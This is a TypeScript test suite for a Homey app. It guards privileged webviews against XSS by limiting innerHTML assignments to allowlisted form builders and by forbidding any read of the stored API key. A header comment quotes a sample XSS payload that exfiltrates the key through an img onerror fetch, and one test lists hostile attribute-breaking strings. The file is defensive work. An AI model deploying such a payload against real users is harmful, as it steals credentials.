import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync, existsSync } from 'node:fs';
import { join } from 'node:path';

import { ENTRY_ID_SHAPE } from '../../lib/schedules/schedule-types';

/**
 * The two privileged webviews, and what may reach a HTML parser inside them.
 *
 * Both surfaces are privileged in the same way, and it is worth being blunt about
 * it: **the API key lives in `homey.settings`**, so a settings webview can read
 * it with `Homey.get('flowWriteApiKey')`. That is the SDK's own design and not
 * something this app can prevent. "The key is never returned over the app API" is
 * true and is not the whole perimeter — the perimeter is these files, and it
 * holds only while nothing here executes markup it did not author.
 *
 * The values these views render are device names, zone names, capability labels
 * and error text from other people's integrations. None of it is authored by us.
 * A light named `"><img src=x onerror=fetch('…?k='+Homey.get('flowWriteApiKey'))>`
 * was one string concatenation away from working.
 *
 * So: no interpolated value passes through an HTML parser, with two allowlisted
 * exceptions named and argued below.
 */

const ROOT = join(import.meta.dirname, '..', '..');

/**
 * The two form builders that still assign `innerHTML`, and why each is allowed.
 *
 * Both build a FORM — selects, range inputs, checkboxes — out of our own locale
 * strings, integers, and an id constrained by `ENTRY_ID_SHAPE`. There is no
 * third-party string anywhere in either: no device name, no zone name, no error
 * text. Converting them means rewriting `timeSelects`, `durationSelects` and
 * `options` too, in two screens that cannot be exercised without hardware, to
 * remove a risk that is provably not present.
 *
 * The entry is by FILE and by the one function in it. A new interpolated
 * `innerHTML` anywhere — including a second one in these files — fails the test.
 */
const ALLOWED = new Map<string, string>([
  ['drivers/schedule/pair/schedule.html', 'entryHtml'],
  ['drivers/schedule/repair/schedule.html', 'entryHtml'],
  ['drivers/curve/pair/curve.html', 'pointHtml'],
  ['drivers/curve/repair/curve.html', 'pointHtml'],
]);

/** Every privileged webview on disk: the settings page and every pairing view. */
function privilegedViews(): string[] {
  const found = ['settings/index.html'];
  for (const driver of readdirSync(join(ROOT, 'drivers'))) {
    for (const mode of ['pair', 'repair']) {
      const dir = join(ROOT, 'drivers', driver, mode);
      if (!existsSync(dir)) continue;
      for (const file of readdirSync(dir)) {
        if (file.endsWith('.html')) found.push(`drivers/${driver}/${mode}/${file}`);
      }
    }
  }
  return found;
}

const read = (view: string) => readFileSync(join(ROOT, view), 'utf8');

/** Assignments only. A mention inside a comment is not an assignment. */
function innerHtmlAssignments(source: string): string[] {
  return source
    .split('\n')
    .filter(line => /\.innerHTML\s*=/.test(line))
    .filter(line => !/^\s*(\/\/|\*|\/\*)/.test(line.trimStart()) === true || !/^\s*[/*]/.test(line))
    .map(line => line.trim());
}

describe('no interpolated innerHTML in a privileged webview', () => {
  const views = privilegedViews();

  test('there are views to check, discovered from disk', () => {
    // Discovered rather than listed: a new driver's screens are covered the
    // moment they exist, which is the same reason pair-view-styles.test.ts
    // discovers its own.
    assert.ok(views.length >= 10, `found ${views.length} views`);
    assert.ok(views.includes('settings/index.html'));
  });

  test('the settings page assigns innerHTML nowhere at all', () => {
    // The strongest claim available, and it is true: every value it renders goes
    // through `textContent`. It has no `escapeHtml()` any more either, because
    // there is no concatenation left to make safe.
    assert.deepEqual(innerHtmlAssignments(read('settings/index.html')), []);
    assert.equal(read('settings/index.html').includes('function escapeHtml'), false);
  });

  test('every other assignment is one of the two allowlisted form builders', () => {
    for (const view of views) {
      const assignments = innerHtmlAssignments(read(view));
      const allowed = ALLOWED.get(view);

      if (!allowed) {
        assert.deepEqual(
          assignments, [],
          `${view} assigns innerHTML. Build the node instead — see node() in `
          + 'any of the views, and the reasoning at the top of this file',
        );
        continue;
      }

      assert.equal(
        assignments.length, 1,
        `${view} has ${assignments.length} innerHTML assignments; exactly one is `
        + `allowed, the ${allowed} render`,
      );
      assert.match(
        assignments[0]!, new RegExp(allowed),
        `${view}'s single allowed assignment should be the ${allowed} render`,
      );
    }
  });

  test('the allowlisted builders still escape everything they interpolate', () => {
    // The allowance rests on two things: the values are ours, and they are
    // escaped anyway. If either stops being true the allowance is void.
    for (const view of ALLOWED.keys()) {
      const source = read(view);
      assert.ok(
        source.includes('function escapeHtml'),
        `${view} is allowed to build markup only while it still escapes`,
      );
      assert.ok(
        source.split('escapeHtml(').length > 10,
        `${view} has stopped escaping most of what it interpolates`,
      );
    }
  });

  test('and the ids they interpolate cannot escape an attribute', () => {
    // `data-id="' + escapeHtml(entry.id) + '"` is safe twice over: the id is
    // server-generated and shape-constrained (Phase 4), and it is escaped. This
    // asserts the first half, which is the one a future change could break.
    for (const id of ['s0', 'sa1b2c3d4', 'morning-lights']) {
      assert.match(id, ENTRY_ID_SHAPE);
    }
    for (const hostile of ['"><img src=x>', "' onload='x", 'a b', 'a:b']) {
      assert.doesNotMatch(hostile, ENTRY_ID_SHAPE);
    }
  });
});

describe('no view reads the API key', () => {
  const FORBIDDEN = [
    // The settings storage key, as lib/credential-service.ts spells it.
    'flowWriteApiKey',
  ];

  test('the key is never read back into a webview', () => {
    /**
     * A defensive convention, not a platform guarantee.
     *
     * `Homey.get('flowWriteApiKey')` would work — the settings webview has that
     * access by design. Nothing needs it: a key is WRITTEN through the app API
     * (which validates it with a real Flow write) and its status is read back as
     * `{ present, valid, failure }`, never as the token. So the token never
     * enters a document, and the XSS above has nothing to steal even if the rule
     * above it were ever broken.
     */
    for (const view of privilegedViews()) {
      const source = read(view);
      for (const token of FORBIDDEN) {
        assert.equal(
          source.includes(token), false,
          `${view} mentions "${token}". A webview never needs the token itself — `
          + 'see the reasoning at the top of this file',
        );
      }
    }
  });

  test('the app API never returns it either', () => {
    // The other half of the perimeter, asserted here so both halves are in one
    // place. diagnostics-redaction.test.ts covers the log and diagnostics paths.
    const api = readFileSync(join(ROOT, 'api.ts'), 'utf8');
    assert.equal(api.includes('flowWriteApiKey'), false);
    assert.equal(api.includes('getWriteClient'), false);
  });
});
